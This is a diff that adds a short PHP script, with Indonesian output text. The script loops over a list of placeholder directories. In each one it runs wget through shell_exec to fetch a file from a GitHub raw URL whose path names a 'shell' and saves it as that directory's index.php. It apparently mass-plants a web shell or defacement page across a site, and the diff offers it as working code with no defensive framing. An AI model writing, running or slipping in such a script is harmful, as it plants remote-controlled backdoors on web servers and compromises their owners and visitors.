@@ -1,0 +1,16 @@
+<?php
+$directories = [
+    '/path/to/your/',
+    '/path/to/your/',
+    '/path/to/your/',
+    '/path/to/your/',
+    '/path/to/your/',
+];
+$url = 'https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo4new.txt';
+foreach ($directories as $dir) {
+    $command = "wget $url -O " . escapeshellarg($dir . 'index.php');
+    $output = shell_exec($command);
+    echo "Mengunduh ke: $dir\n";
+    echo $output . "\n";
+}
+?>
